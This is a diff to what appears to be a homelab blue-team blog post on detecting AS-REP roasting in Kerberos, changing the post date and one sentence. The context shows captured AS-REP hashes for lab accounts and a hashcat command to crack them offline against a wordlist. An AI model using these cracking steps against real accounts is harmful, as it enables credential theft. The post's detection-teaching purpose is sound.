@@ -2,7 +2,7 @@
 layout: single
 classes: wide
 title:  "Detecting Kerberos Abuse Part 1: ASReproasting"
-date:   2026-02-15 20:26:59 -0500
+date:   2026-02-15 00:06:59 -0500
 categories: homelab blueteam kerberos
 ---
 
@@ -137,7 +137,7 @@ $krb5asrep$23$jdenton@BTLAB.LOCAL:35260a4577fc1115984ecbc3a9f1b6c3$06ce44df54d76
 $krb5asrep$23$lwang@BTLAB.LOCAL:eaaee8740bc23d90acca19651c0b5f91$5024dbe55dbe9862eeaf5aa54ec8a32ab93f3acf54776a1167d1bda6b0a1af208d64c997b140edf5542bb650d9b7db71836a22f7c5db01f401023dc209b0151fea768f883821f5e7723bc2bee8cdda95411d53c020e96ba5d5156bbc27ee0447b2a5962399154342b5a9ea6192d8531f8d7909e6f6cbcb352c99ace0c6138676ce3ecec9054e7816a7e28c0c6c59c76987f99f96aa0efb1a50ff06da9af8f141048de6c5d82b070b887335bc375cbaa4a41ce5af5a4033411ca0325ef0c4ce2c76b4c7da3bd1c86ecd0e689502f428a0608a8213b0b827d388a3874e690f75c21e2f3f18904ff23af05b
 ```
 
-We get session keys for `jdenton` and `lwang`, which we can crack offline with hashcat. Use mode 18200 for Kerberos AS-REP cracking.
+We get session keys for `jdenton` and `lwang`, which we can try to crack offline with hashcat. Use mode 18200 for Kerberos AS-REP cracking.
 
 `C:\hashcat>hashcat.exe -m 18200 jdenton.asreproast rockyou.txt`
 
